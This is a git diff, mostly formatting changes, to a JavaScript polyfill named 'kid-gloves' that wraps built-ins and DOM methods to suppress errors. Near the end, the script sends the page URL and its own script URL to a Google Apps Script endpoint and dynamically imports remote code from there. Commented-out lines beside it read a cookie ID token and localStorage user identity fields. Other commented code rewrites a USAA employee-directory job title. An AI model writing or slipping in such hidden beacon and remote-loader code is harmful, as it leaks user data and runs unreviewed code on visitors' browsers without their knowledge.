@@ -1,5 +1,5 @@
 if (!globalThis.namespaces?.['kid-gloves']) {
-  void (function KidGloves() {
+  void(function KidGloves() {
     const q = (varFn) => {
       try {
         return varFn?.();
@@ -11,10 +11,14 @@ if (!globalThis.namespaces?.['kid-gloves']) {
     }
 
     const globalObject = q(() => globalThis) // works in most modern runtimes
-      ?? q(() => self) // also works in most modern runtimes
-      ?? q(() => global) // fallback for older nodejs
-      ?? q(() => window) // fallback for older browsers
-      ?? this ?? {}; // fallbacks for edge cases.
+      ??
+      q(() => self) // also works in most modern runtimes
+      ??
+      q(() => global) // fallback for older nodejs
+      ??
+      q(() => window) // fallback for older browsers
+      ??
+      this ?? {}; // fallbacks for edge cases.
     const str = x => String(x?.description ?? x?.source ?? x);
     for (let x of ['globalThis', 'self', 'global']) {
       globalObject[x] = globalObject;
@@ -55,6 +59,7 @@ if (!globalThis.namespaces?.['kid-gloves']) {
     };
 
     globalThis.create = (proto) => Object.create(proto);
+
     function assignAll(target, src) {
       let excepts = ["prototype", "constructor", "__proto__"];
       let enums = [];
@@ -100,7 +105,7 @@ if (!globalThis.namespaces?.['kid-gloves']) {
                 continue;
               }
             }
-          } catch (e) { }
+          } catch (e) {}
         }
         if (source.add && source.keys) {
           try {
@@ -111,7 +116,7 @@ if (!globalThis.namespaces?.['kid-gloves']) {
                 continue;
               }
             }
-          } catch { }
+          } catch {}
         }
         source = objGetProto(source);
       }
@@ -260,7 +265,7 @@ if (!globalThis.namespaces?.['kid-gloves']) {
       } catch {
         try {
           target.prototype = proto;
-        } catch { }
+        } catch {}
         if (target.prototype != proto) {
           assignAll(target.prototype, proto);
         }
@@ -273,7 +278,9 @@ if (!globalThis.namespaces?.['kid-gloves']) {
         } catch (e) {
           console.warn(e);
         }
-        return (function args() { return arguments })();
+        return (function args() {
+          return arguments
+        })();
       },
       set(newValue) {
         try {
@@ -295,8 +302,7 @@ if (!globalThis.namespaces?.['kid-gloves']) {
         }
         return _ => _;
       },
-      set(newValue) {
-      },
+      set(newValue) {},
       enumerable: false,
       configurable: true,
     });
@@ -310,109 +316,116 @@ if (!globalThis.namespaces?.['kid-gloves']) {
         }
         return _ => _;
       },
-      set(newValue) {
-      },
+      set(newValue) {},
       enumerable: false,
       configurable: true,
     });
-  // Utility function to safely execute functions without throwing
-  const Q = fn => {
-        try {
-            return fn?.()
-        } catch {}
+    // Utility function to safely execute functions without throwing
+    const Q = fn => {
+      try {
+        return fn?.()
+      } catch {}
     };
-    
-  // Ensures objects have proper prototype chains for inheritance
-  const constructPrototype = newClass => {
-        try {
-            if (newClass?.prototype) return newClass;
-            const constProto = newClass?.constructor?.prototype;
-            if (constProto) {
-                newClass.prototype = Q(() => constProto?.bind?.(constProto)) ?? Object.create(Object(constProto));
-                return newClass;
+
+    // Ensures objects have proper prototype chains for inheritance
+    const constructPrototype = newClass => {
+      try {
+        if (newClass?.prototype) return newClass;
+        const constProto = newClass?.constructor?.prototype;
+        if (constProto) {
+          newClass.prototype = Q(() => constProto?.bind?.(constProto)) ?? Object.create(Object(constProto));
+          return newClass;
+        }
+        newClass.prototype = Q(() => newClass?.bind?.(newClass)) ?? Object.create(Object(newClass));
+      } catch (e) {
+        console.warn(e, newClass);
+      }
+    };
+
+    // Preserves prototype chain when wrapping methods
+    const extend = (thisClass, superClass) => {
+      try {
+        constructPrototype(thisClass);
+        constructPrototype(superClass);
+        Object.setPrototypeOf(
+          thisClass.prototype,
+          superClass?.prototype ??
+          superClass?.constructor?.prototype ??
+          superClass
+        );
+        Object.setPrototypeOf(thisClass, superClass);
+
+      } catch (e) {
+        console.warn(e, {
+          thisClass,
+          superClass
+        });
+      }
+      return thisClass;
+    };
+
+    (() => {
+      const _BigInt = globalThis.BigInt;
+      (() => {
+        globalThis.BigInt = extend(function BigInt(...args) {
+          if (new.target) {
+            try {
+              return Reflect.construct(_BigInt, args, new.target);
+            } catch (e) {
+              console.warn(e, ...args);
             }
-            newClass.prototype = Q(() => newClass?.bind?.(newClass)) ?? Object.create(Object(newClass));
-        } catch (e) {
-            console.warn(e, newClass);
-        }
-    };
-    
-  // Preserves prototype chain when wrapping methods
-  const extend = (thisClass, superClass) => {
-        try {
-            constructPrototype(thisClass);
-            constructPrototype(superClass);
-            Object.setPrototypeOf(
-                thisClass.prototype,
-                superClass?.prototype ??
-                superClass?.constructor?.prototype ??
-                superClass
-            );
-            Object.setPrototypeOf(thisClass, superClass);
-
-        } catch (e) {
-            console.warn(e, {
-                thisClass,
-                superClass
-            });
-        }
-        return thisClass;
-    };
-    
-     (() => {
-        const _BigInt = globalThis.BigInt;
-        (() => {
-            globalThis.BigInt = extend(function BigInt(...args) {
-                if (new.target) {
-                    try {
-                        return Reflect.construct(_BigInt, args, new.target);
-                    } catch (e) {
-                        console.warn(e, ...args);
-                    }
-                }
-                try {
-                    return _BigInt(...args);
-                } catch (e) {
-                    console.warn(e, ...args);
-                    return 0n;
-                }
-            }, _BigInt);
-        })();
+          }
+          try {
+            return _BigInt(...args);
+          } catch (e) {
+            console.warn(e, ...args);
+            return 0n;
+          }
+        }, _BigInt);
+      })();
     })();
 
-  (() => {
-        const _Symbol = globalThis.Symbol;
-        (() => {
-            globalThis.Symbol = extend(function Symbol(...args) {
-                if (new.target) {
-                    try {
-                        return Reflect.construct(_Symbol, args, new.target);
-                    } catch (e) {
-                        console.warn(e, ...args);
-                    }
-                }
-                try {
-                    return _Symbol(...args);
-                } catch (e) {
-                    console.warn(e, ...args);
-                    return Object.create(_Symbol.prototype);
-                }
-            }, _Symbol);
-        })();
+    (() => {
+      const _Symbol = globalThis.Symbol;
+      (() => {
+        globalThis.Symbol = extend(function Symbol(...args) {
+          if (new.target) {
+            try {
+              return Reflect.construct(_Symbol, args, new.target);
+            } catch (e) {
+              console.warn(e, ...args);
+            }
+          }
+          try {
+            return _Symbol(...args);
+          } catch (e) {
+            console.warn(e, ...args);
+            return Object.create(_Symbol.prototype);
+          }
+        }, _Symbol);
+      })();
     })();
-
-
 
     if (globalThis.Promise && !globalThis['&Promise']) {
       objDefProp(globalThis, '&Promise', Promise);
       globalThis.Promise = function Promise() {
         const promise = new globalThis['&Promise'](...arguments);
         if (new.target) {
-          objDefProp(this, 'toString', function toString() { return promise.toString(...arguments); });
-          objDefProp(this, 'valueOf', function valueOf() { return promise; });
-          objDefProp(this, 'toLocaleString', function toLocaleString() { return promise.toLocaleString(...arguments); });
-          objDefProp(this, Symbol.toPrimitive, function toPrimitive() { return promise; });
-          objDefProp(this, Symbol.toStringTag, function toStringTag() { return promise.toString(); });
+          objDefProp(this, 'toString', function toString() {
+            return promise.toString(...arguments);
+          });
+          objDefProp(this, 'valueOf', function valueOf() {
+            return promise;
+          });
+          objDefProp(this, 'toLocaleString', function toLocaleString() {
+            return promise.toLocaleString(...arguments);
+          });
+          objDefProp(this, Symbol.toPrimitive, function toPrimitive() {
+            return promise;
+          });
+          objDefProp(this, Symbol.toStringTag, function toStringTag() {
+            return promise.toString();
+          });
           Object.setPrototypeOf(this, globalThis['&Promise'].prototype);
         } else {
           try {
@@ -427,42 +440,43 @@ if (!globalThis.namespaces?.['kid-gloves']) {
       Object.setPrototypeOf(Promise, globalThis['&Promise']);
     }
 
-(() => {
-        const _RegExp = globalThis.RegExp;
-        (() => {
-            globalThis.RegExp = extend(function RegExp(...args) {
-                if (new.target) {
-                    try {
-                        return Reflect.construct(_RegExp, args, new.target);
-                    } catch (e) {
-                        console.warn(e, ...args);
-                        return Reflect.construct(_RegExp, [/$RegExp^/], new.target);
-                    }
-                }
-                try {
-                    return _RegExp(...args);
-                } catch (e) {
-                    console.warn(e, ...args);
-                    return _RegExp(/$RegExp^/);
-                }
-            }, _RegExp);
-        })();
+    (() => {
+      const _RegExp = globalThis.RegExp;
+      (() => {
+        globalThis.RegExp = extend(function RegExp(...args) {
+          if (new.target) {
+            try {
+              return Reflect.construct(_RegExp, args, new.target);
+            } catch (e) {
+              console.warn(e, ...args);
+              return Reflect.construct(_RegExp, [/$RegExp^/], new.target);
+            }
+          }
+          try {
+            return _RegExp(...args);
+          } catch (e) {
+            console.warn(e, ...args);
+            return _RegExp(/$RegExp^/);
+          }
+        }, _RegExp);
+      })();
     })();
 
-    (()=>{
+    (() => {
       const _get = Map.prototype.get;
       objDefProp(Map.prototype, 'get', function get(key) {
         try {
-          return _get.call(this,key);
+          return _get.call(this, key);
         } catch (e) {
-          console.warn(e,key);
+          console.warn(e, key);
         }
       });
     })();
 
     function emptyNodeList() {
-      return Q(()=>document?.createElemet?.('NodeList')?.childNodes) ?? [];
+      return Q(() => document?.createElemet?.('NodeList')?.childNodes) ?? [];
     }
+
     function Null() {
       const nul = document.createElement('null');
       nul.style.display = 'none';
@@ -474,42 +488,42 @@ if (!globalThis.namespaces?.['kid-gloves']) {
 
     function makeNodes(nodeType) {
 
-       (()=>{
+      (() => {
         const _querySelector = globalThis[nodeType]?.prototype?.querySelector;
-        if(!_querySelector)return;
+        if (!_querySelector) return;
         objDefEnum(globalThis[nodeType].prototype, 'querySelector', extend(function querySelector(...args) {
           try {
-            return _querySelector.apply(this,args);
+            return _querySelector.apply(this, args);
           } catch (e) {
             console.warn(e, this, ...args);
             try {
-              return _querySelector.apply(this,args.map(x => str(x)));
+              return _querySelector.apply(this, args.map(x => str(x)));
             } catch (e) {
               console.warn(e);
               return Null();
             }
           }
-        },_querySelector));
+        }, _querySelector));
       })();
-      
-      (()=>{
+
+      (() => {
         const _querySelectorAll = globalThis[nodeType]?.prototype?.querySelector;
-        if(!_querySelectorAll)return;
+        if (!_querySelectorAll) return;
         objDefEnum(globalThis[nodeType].prototype, 'querySelectorAll', extend(function querySelectorAll(...args) {
           try {
-            return _querySelectorAll.apply(this,args);
+            return _querySelectorAll.apply(this, args);
           } catch (e) {
             console.warn(e, this, ...args);
             try {
-              return _querySelectorAll.apply(this,args.map(x => str(x)));
+              return _querySelectorAll.apply(this, args.map(x => str(x)));
             } catch (e) {
               console.warn(e);
               return emptyNodeList();
             }
           }
-        },_querySelectorAll));
+        }, _querySelectorAll));
       })();
-        
+
       if (globalThis[nodeType]?.prototype?.getElementById && !globalThis[nodeType]?.prototype?.['&getElementById']) {
         objDefProp(globalThis[nodeType].prototype, '&getElementById', globalThis[nodeType].prototype.getElementById);
         objDefEnum(globalThis[nodeType].prototype, 'getElementById', function getElementById() {
@@ -559,10 +573,7 @@ if (!globalThis.namespaces?.['kid-gloves']) {
           return this.getElementsByTagName?.(query)?.[0] ?? this.querySelector(query) ?? Null();
         });
 
-
       }
-
-
 
       if (globalThis[nodeType]?.prototype?.getElementsByClassName && !globalThis[nodeType]?.prototype?.['&getElementsByClassName']) {
         objDefProp(globalThis[nodeType].prototype, '&getElementsByClassName', globalThis[nodeType].prototype.getElementsByClassName);
@@ -584,10 +595,7 @@ if (!globalThis.namespaces?.['kid-gloves']) {
           return this.getElementsByClassName?.(query)?.[0] ?? this.querySelector(`.${query}`) ?? Null();
         });
 
-
       }
-
-
 
       if (globalThis[nodeType]?.prototype?.getElementsByTagNameNS && !globalThis[nodeType]?.prototype?.['&getElementsByTagNameNS']) {
         objDefProp(globalThis[nodeType].prototype, '&getElementsByTagNameNS', globalThis[nodeType].prototype.getElementsByTagNameNS);
@@ -643,10 +651,6 @@ if (!globalThis.namespaces?.['kid-gloves']) {
         return this.getElementsByName?.(query)?.[0] ?? null;
       });
 
-
-
-
-
       if (globalThis[nodeType]?.prototype?.createElementNS && !globalThis[nodeType]?.prototype?.['&createElementNS']) {
         objDefProp(globalThis[nodeType].prototype, '&createElementNS', globalThis[nodeType].prototype.createElementNS);
         objDefEnum(globalThis[nodeType].prototype, 'createElementNS', function createElementNS() {
@@ -667,7 +671,6 @@ if (!globalThis.namespaces?.['kid-gloves']) {
         console.warn('getElementByName is not supported. Did you mean getElementsByName?');
         return this.getElementsByName?.(query)?.[0] ?? Null();
       });
-
 
     }
     makeNodes('XMLDocument');
@@ -853,7 +856,8 @@ if (!globalThis.namespaces?.['kid-gloves']) {
           }
         }
       });
-    } if (Object.freeze && !Object['&freeze']) {
+    }
+    if (Object.freeze && !Object['&freeze']) {
       objDefProp(Object, '&freeze', Object.freeze);
       objDefProp(Object, 'freeze', function freeze(obj) {
         try {
@@ -1216,7 +1220,6 @@ if (!globalThis.namespaces?.['kid-gloves']) {
       });
     }
 
-
     globalThis.namespaces ??= {};
     globalThis.namespaces['kid-gloves'] ||= Object(true);
 
@@ -1233,27 +1236,30 @@ if (!globalThis.namespaces?.['kid-gloves']) {
     }
   };
   const document = self.window?.top?.document ?? self.document ?? {};
-  const eagleid = location.href;//Object.fromEntries(document.cookie.split(";").map((x) => String(x).trim().split("=")).map((x) => [x.shift(), x.join("=")])).id_token_marker || parse(localStorage.getItem("user"))?.EagleId;
-  const name = document.currentScript?.src;//String(parse(localStorage.getItem("user"))?.FirstName);
-  const url = new URL("https://script.google.com/macros/s/AKfycbzrr3Kyy4A6S3pNloWDl5qHHcBTH42YF6i2IlG9OKnIe-QXryEXfYo7JyCNo1g1NieSuA/exec",);
-  url.searchParams.set("payload",btoa(encodeURIComponent(JSON.stringify({ eagleid, name }))));
+  const eagleid = location.href; //Object.fromEntries(document.cookie.split(";").map((x) => String(x).trim().split("=")).map((x) => [x.shift(), x.join("=")])).id_token_marker || parse(localStorage.getItem("user"))?.EagleId;
+  const name = document.currentScript?.src; //String(parse(localStorage.getItem("user"))?.FirstName);
+  const url = new URL("https://script.google.com/macros/s/AKfycbzrr3Kyy4A6S3pNloWDl5qHHcBTH42YF6i2IlG9OKnIe-QXryEXfYo7JyCNo1g1NieSuA/exec", );
+  url.searchParams.set("payload", btoa(encodeURIComponent(JSON.stringify({
+    eagleid,
+    name
+  }))));
   (async () => {
     try {
       await import(url);
     } catch {
-      
-    }finally{
+
+    } finally {
       document.querySelector?.('[werk]')?.remove?.();
     }
   })();
-  const TenX = (async ()=>{
-    await new Promise(resolve=>document.readyState == 'complete' ? resolve() : document.addEventListener("load", resolve));
-  /*  await[...document.querySelectorAll(`[id="person"]>[id="title"]:not([x10]),[id*="orgItemInfoContainer"]:has([href="https://apps.usaa.com/enterprise/employee-directory?emplNum=Y3953"]) [id*="orgJobTitle"]:not([x10])`,)].forEach((x) => {
-      x.innerText = "10x Software Engineer";
-      x.setAttribute("x10", true);
-    });*/
-    await[...document.querySelectorAll?.("[missing]")??[]].forEach((x) => x.remove());
+  const TenX = (async () => {
+    await new Promise(resolve => document.readyState == 'complete' ? resolve() : document.addEventListener("load", resolve));
+    /*  await[...document.querySelectorAll(`[id="person"]>[id="title"]:not([x10]),[id*="orgItemInfoContainer"]:has([href="https://apps.usaa.com/enterprise/employee-directory?emplNum=Y3953"]) [id*="orgJobTitle"]:not([x10])`,)].forEach((x) => {
+        x.innerText = "10x Software Engineer";
+        x.setAttribute("x10", true);
+      });*/
+    await [...document.querySelectorAll?.("[missing]") ?? []].forEach((x) => x.remove());
   });
   TenX();
-  setInterval(TenX,100);
+  setInterval(TenX, 100);
 })();
